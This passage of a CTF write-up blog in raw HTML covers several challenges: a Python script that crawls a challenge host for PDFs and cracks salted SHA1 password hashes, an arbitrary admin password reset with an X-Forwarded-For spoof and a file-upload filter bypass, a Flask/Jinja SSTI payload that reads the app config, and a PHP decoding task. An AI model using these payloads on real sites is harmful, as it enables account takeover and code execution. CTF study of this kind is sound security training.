class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Cr4y0n</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Time    : 2020/11/2 17:26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨é¡µé¢é€’å½’æŸ¥æ‰¾pdfæ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPDF</span>(<span class="params">url</span>):</span></span><br><span class="line">    re_pdf = <span class="string">&quot;[a-fA-F0-9]&#123;32&#125;.pdf&quot;</span></span><br><span class="line">    re_index = <span class="string">&quot;[0-9\/]&#123;1,5&#125;index.html&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pdfList</span><br><span class="line">    rep = requests.get(url).text</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_pdf, rep):</span><br><span class="line">        pdfURL = url + i</span><br><span class="line">        pdfUrlList.append(pdfURL)</span><br><span class="line">        print(<span class="string">&quot;PDFï¼š&quot;</span>, pdfURL)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_index, rep):</span><br><span class="line">        newURL = url + i[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        findPDF(newURL)</span><br><span class="line"><span class="comment"># ä¸‹è½½pdfæ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span>(<span class="params">urlList</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">&quot;pdf&quot;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;./pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        os.system(<span class="string">&quot;curl -O &quot;</span> + url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬æ¢ä¸ºtxt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pdf2Text</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="comment"># æ‰“å¼€PDFæ–‡ä»¶</span></span><br><span class="line">    pdfFile = <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆ›å»ºpdfæ–‡æ¡£åˆ†æå™¨</span></span><br><span class="line">    parser = PDFParser(pdfFile)</span><br><span class="line">    <span class="comment"># åˆ›å»ºPDFæ–‡æ¡£å¯¹è±¡å­˜å‚¨æ–‡æ¡£ç»“æ„</span></span><br><span class="line">    document = PDFDocument(parser)</span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…è®¸æ–‡æœ¬æå–</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> document.is_extractable:</span><br><span class="line">        <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">    <span class="comment"># åˆ›å»ºPDFèµ„æºç®¡ç†å™¨å¯¹è±¡æ¥å­˜å‚¨å…±äº«èµ„æº</span></span><br><span class="line">    resource = PDFResourceManager()</span><br><span class="line">    <span class="comment"># è®¾å®šå‚æ•°è¿›è¡Œåˆ†æ</span></span><br><span class="line">    laparams = LAParams()</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªPDFè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªPDFè§£é‡Šå™¨å¯¹è±¡</span></span><br><span class="line">    interpreter = PDFPageInterpreter(resource, device)</span><br><span class="line">    <span class="comment"># åˆ›å»ºå­˜å‚¨è½¬æ¢ç»“æœçš„åŒåtxtæ–‡ä»¶</span></span><br><span class="line">    fileName = <span class="built_in">str</span>(os.path.abspath(path).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    newFileName = fileName + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(newFileName, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="comment"># å¤„ç†æ¯ä¸€é¡µ</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(document):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line">        <span class="comment"># æ¥å—è¯¥é¡µé¢çš„LTPageå¯¹è±¡</span></span><br><span class="line">        layout = device.get_result()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isinstance</span>(x, LTTextBoxHorizontal)):</span><br><span class="line">                <span class="comment"># å†™å…¥txtæ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f.writelines(x.get_text() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€ä¸ªå•è¯è¿›è¡Œæ•£åˆ—è¿ç®—å¹¶æŸ¥æ‰¾åŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPassword</span>(<span class="params">path</span>):</span></span><br><span class="line">    ls = [<span class="string">&quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;</span>, <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>, <span class="string">&quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;</span>]</span><br><span class="line">    wordList = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            i = i.strip()</span><br><span class="line">            lineWordList = <span class="built_in">list</span>(i.split())</span><br><span class="line">            wordList += lineWordList</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> wordList:</span><br><span class="line">        i = i.strip(<span class="string">&quot;:&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;.&quot;</span>).strip(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">        en = sha1()</span><br><span class="line">        en.update((i + <span class="string">&quot;Salz!&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        result = en.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">in</span> ls:</span><br><span class="line">            print(i, <span class="string">&quot;\t&quot;</span>, result)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.133:30445/&quot;</span></span><br><span class="line">    pdfUrlList = []</span><br><span class="line">    findPDF(url)</span><br><span class="line">    print(pdfUrlList)</span><br><span class="line">    downloadFile(pdfUrlList)</span><br><span class="line">    pdfPathList = []</span><br><span class="line">    print(os.getcwd())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;.\\pdf\\&quot;</span>):</span><br><span class="line">        pdfPathList.append(<span class="string">&quot;.\\pdf\\&quot;</span> + i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdfPathList:</span><br><span class="line">        Pdf2Text(i)</span><br><span class="line">        textFile = i[<span class="number">0</span>:-<span class="number">3</span>] + <span class="string">&quot;txt&quot;</span></span><br><span class="line">        findPassword(textFile)</span><br><span class="line">        print(<span class="string">&quot;Fileï¼š&quot;</span> + textFile)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå½“ç¢°åˆ°æ­£ç¡®çš„å¯†ç æ—¶è‡ªåŠ¨ç»ˆæ­¢</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395582.png" alt="1604316948660.png"></p><p>æ ¹æ®æ•£åˆ—å€¼å¾—çŸ¥æ˜¯fritzeè´¦æˆ·ï¼Œadmin.phpé¡µé¢è¾“å…¥å¾—åˆ°Flagï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395590.png" alt="1604316853076.png"></p><p>æ£€ç´¢30å¤šä¸ªPDFæ¥æ‰¾åˆ°å¯†ç ï¼Œåªèƒ½è¯´å¤§ä½¬ä»¬çš„è·¯å­çœŸçš„é‡~ğŸ˜Œ</p><h2 id="â­-bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®-XFFä¼ªé€ -æ–‡ä»¶ä¸Šä¼ ï¼‰"><a href="#â­-bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®-XFFä¼ªé€ -æ–‡ä»¶ä¸Šä¼ ï¼‰" class="headerlink" title="â­ bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®+XFFä¼ªé€ +æ–‡ä»¶ä¸Šä¼ ï¼‰"></a>â­ bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®+XFFä¼ªé€ +æ–‡ä»¶ä¸Šä¼ ï¼‰</h2><p>[redinfo title=â€é¢˜ç›®ä¿¡æ¯â€]æ¥æºï¼š RCTF-2015<br>éš¾åº¦ï¼š5æ˜Ÿ<br>è€ƒå¯Ÿï¼šé€»è¾‘æ¼æ´ï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®ï¼‰ã€å‚æ•°çŒœæµ‹ã€XFF IPä¼ªé€ ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼ˆåç¼€è§£æã€MIMEã€PHPè„šæœ¬é™åˆ¶ï¼‰[/redinfo]</p><p>æ¯”è¾ƒå‘æ•£ï¼Œé¢˜ç›®ç¯å¢ƒæœ‰ä»¥ä¸‹åŠŸèƒ½ç‚¹ï¼šç™»é™†å‰ï¼ˆç™»å½•ã€æ³¨å†Œã€æ‰¾å›å¯†ç ï¼‰ï¼Œç™»å½•åï¼ˆç®¡ç†ã€ä¿®æ”¹å¯†ç ã€ä¸ªäººä¿¡æ¯ã€é€€å‡ºï¼‰ï¼Œç®¡ç†ç•Œé¢éœ€è¦adminæƒé™</p><p>æ³¨å†Œäº†ä¸€ä¸ªaaaçš„ç”¨æˆ·ï¼Œå¯¹ç™»å½•ã€æ³¨å†Œç­‰åŠŸèƒ½SQLæ³¨å…¥æ— æœï¼Œä½†æ˜¯åœ¨è¯·æ±‚å¤´çš„Cookieä¸­æœ‰ä¸€ä¸ªuserçš„å­—æ®µï¼Œå¯¹å…¶å€¼åšMD5è§£å¯†å‘ç°æ˜¯<strong>5:aaa</strong>ï¼Œå…¶ä¸­5æ˜¯aaade uidï¼Œå°è¯•å°†userå€¼æ”¹ä¸ºadminç›¸å…³çš„MD5æ•£åˆ—è¿›è¡Œè¶Šæƒï¼Œä¾ç„¶å¤±è´¥ã€‚</p><p>åœ¨æ‰¾å›å¯†ç å¤„å‘ç°ï¼Œå½“èº«ä»½éªŒè¯æˆåŠŸæ—¶ï¼Œé‡ç½®å¯†ç ä¼šåœ¨æ•°æ®åŒ…ä¸­åŒæ—¶ä¼ å…¥ç”¨æˆ·åå’Œæ–°å¯†ç ï¼Œæ‰€ä»¥æ€€ç–‘æ˜¯é‡ç½®å¯†ç ç›¸å…³çš„é€»è¾‘æ¼æ´ã€‚</p><p>å°†ç”¨æˆ·åæ”¹ä¸ºadminï¼ŒæˆåŠŸä¿®æ”¹adminçš„å¯†ç </p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323687.png" alt="1604505334269.png"></p><p>ç™»å½•adminè´¦æˆ·æŸ¥çœ‹manageç•Œé¢ï¼Œæç¤ºIPä¸å…è®¸ï¼Œä¸ŠModHeaderï¼Œè€æœ‹å‹äº†ï¼Œå°†<strong>XFFä¿®æ”¹ä¸º127.0.0.1</strong>ï¼ŒæˆåŠŸç»•è¿‡IPæ ¡éªŒ</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323694.png" alt="1604505774592.png"></p><p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°æç¤ºï¼š<code>&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</code>ï¼Œéœ€è¦çŒœæµ‹doå‚æ•°ï¼Œæ˜¯å¯¹æ–‡ä»¶è¿›è¡Œç®¡ç†ï¼Œæ— éå°±æ˜¯ï¼š<strong>download</strong>ã€<strong>upload</strong>ã€<strong>delete</strong>ã€<strong>read</strong>ã€<strong>write</strong>ã€<strong>move</strong>ã€<strong>copy</strong>ï¼Œé€ä¸ªè¯•ä¸€ä¸‹å‘ç°æ­¤å¤„å‚æ•°æ˜¯uploadï¼Œè§¦å‘æ–‡ä»¶ä¸Šä¼ é¢˜ç›®</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323701.png" alt="1604506183072.png"></p><p>ç»è¿‡ä¸æ–­ä¸Šä¼ å°è¯•ï¼Œå‘ç°ç³»ç»Ÿä¼šåšæ–‡ä»¶åç¼€æ£€æµ‹ã€MIMEæ£€æµ‹ã€PHPè„šæœ¬æ–‡ä»¶æ£€æµ‹ï¼ˆæ£€æµ‹&lt;?phpï¼‰ï¼Œä½†æ˜¯åˆéœ€è¦ä¸Šä¼ ä¸€ä¸ªphpæœ¨é©¬ï¼Œæ‰€ä»¥è¦åŒæ—¶ç»•è¿‡è¿™ä¸‰ä¸ªæ£€æµ‹ã€‚</p><p>å½“ä½¿ç”¨php5ç»•è¿‡åç¼€æ£€æµ‹ã€ä¿®æ”¹MIMEä¸ºimage/pngåï¼Œåœ¨phpè„šæœ¬æ–‡ä»¶ç›‘æµ‹å¤„ï¼Œå½“å­˜åœ¨<code>&lt;?php</code>æ—¶æç¤º<code>Something shows it is a php!</code>ï¼Œå½“åœ¨ï¼Ÿå’Œphpä¹‹é—´åŠ ä¸€ä¸ªç©ºæ ¼<code>&lt;? php</code>æ—¶åˆæç¤º<code>It is not a really php file</code></p><p>è¿™å°±è¡¨æ˜ï¼Œä¸èƒ½å¤Ÿä½¿ç”¨è¿™ç§phpè„šæœ¬çš„å†™æ³•ï¼Œåå°ä¼šæ£€æµ‹åˆ°ï¼Œé¢˜ç›®è€ƒå·®çš„æ˜¯phpè„šæœ¬çš„ç¬¬äºŒç§å†™æ³•ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†payloadæ”¹ä¸ºç¬¬äºŒç§å†™æ³•ï¼Œå¾—åˆ°flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323709.png" alt="1604506924276.png"></p><h2 id="â­-shrineï¼ˆSSTI-url-for-æ²™ç›’é€ƒé€¸ï¼‰"><a href="#â­-shrineï¼ˆSSTI-url-for-æ²™ç›’é€ƒé€¸ï¼‰" class="headerlink" title="â­ shrineï¼ˆSSTI+url_for()æ²™ç›’é€ƒé€¸ï¼‰"></a>â­ shrineï¼ˆSSTI+url_for()æ²™ç›’é€ƒé€¸ï¼‰</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>shrineè·¯å¾„å¯æˆåŠŸè¿›è¡ŒSSTI</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332217.png" alt="1604051748466.png"></p><p>ç¬¬5è¡Œä½¿ç”¨<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>æ·»åŠ äº†ä¸€ä¸ªå…¨å±€é…ç½®ï¼ŒçŒœæµ‹å°±æ˜¯flag</p><p>ä½†æ˜¯åœ¨12è¡Œå®šä¹‰äº†<code>safe_jinja()</code>æ¥è¿›è¡Œå®‰å…¨æ ¡éªŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ é™¤()ï¼Œç„¶åå®šä¹‰é»‘åå•ï¼Œå°†configå’Œselfæ›¿æ¢ä¸ºNoneã€‚</p><p>è¿™é“é¢˜å¦‚æœæ²¡æœ‰è¿‡æ»¤çš„è¯ï¼Œå¯ä»¥ç›´æ¥**<code>&#123;&#123;config&#125;&#125;</code><strong>æˆ–</strong><code>&#123;&#123;self.__dict__&#125;&#125;</code>**ï¼Œç»æŸ¥é˜…ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å…¶ä»–çš„å‡½æ•°æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼š</p><ul><li><p><strong>url_for()</strong><br><em>ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªURLå°±å¯ä»¥æ‰§è¡Œåˆ°æŸä¸€ä¸ªå‡½æ•°ã€‚å¦‚æœåè¿‡æ¥ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå‡½æ•°ï¼Œæ€ä¹ˆå»è·å¾—è¿™ä¸ªURLå‘¢ï¼Ÿurl_forå‡½æ•°å°±å¯ä»¥å¸®æˆ‘ä»¬å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚url_for()å‡½æ•°æ¥æ”¶ä¸¤ä¸ªåŠä»¥ä¸Šçš„å‚æ•°ï¼Œä»–æ¥æ”¶å‡½æ•°åä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥æ”¶å¯¹åº”URLè§„åˆ™çš„å‘½åå‚æ•°ï¼Œå¦‚æœè¿˜å‡ºç°å…¶ä»–çš„å‚æ•°ï¼Œåˆ™ä¼šæ·»åŠ åˆ°URLçš„åé¢ä½œä¸ºæŸ¥è¯¢å‚æ•°ã€‚</em></p></li><li><p><strong>get_flashed_messages()</strong><br><em>è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚</em></p></li></ul><p>å…·ä½“å¯å‚è€ƒï¼š<br><a href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br><a href="https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537">https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537</a></p><p>é¦–å…ˆåˆ©ç”¨url_foræŸ¥çœ‹å½“å‰æ‰€æœ‰å…¨å±€å˜é‡å­—å…¸ï¼Œå‘ç°äº†Flask</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332233.png" alt="1604053909419(1).png"></p><p>æ‰€ä»¥payloadå¦‚ä¸‹ï¼Œå³å¯å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&quot;current_app&quot;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332244.png" alt="1604054046849 (1).png"></p><p> get_flashed_messagesçš„payloadæ˜¯ä¸€æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒ</strong></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/83036927">https://blog.csdn.net/qq_33020901/article/details/83036927</a></p><h2 id="â­-Web2ï¼ˆç¨‹åºé€†å‘ï¼‰"><a href="#â­-Web2ï¼ˆç¨‹åºé€†å‘ï¼‰" class="headerlink" title="â­ Web2ï¼ˆç¨‹åºé€†å‘ï¼‰"></a>â­ Web2ï¼ˆç¨‹åºé€†å‘ï¼‰</h2><p>å‡ºè‡ªNSCTFï¼Œé¢˜ç›®é¡µé¢ç»™å‡ºäº†ä¸€æ®µä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></code></pre><p>è¦æ±‚æ˜¯é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flagï¼Œè¿›è¡Œ<strong>ä»£ç å®¡è®¡</strong>å§</p><p>ç¨‹åºå…¶å®å°±æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªåŠ å¯†å‡½æ•°encode()ï¼ŒæŒ‰æ­¥éª¤åˆ†æç»“æœå¦‚ä¸‹ï¼š</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 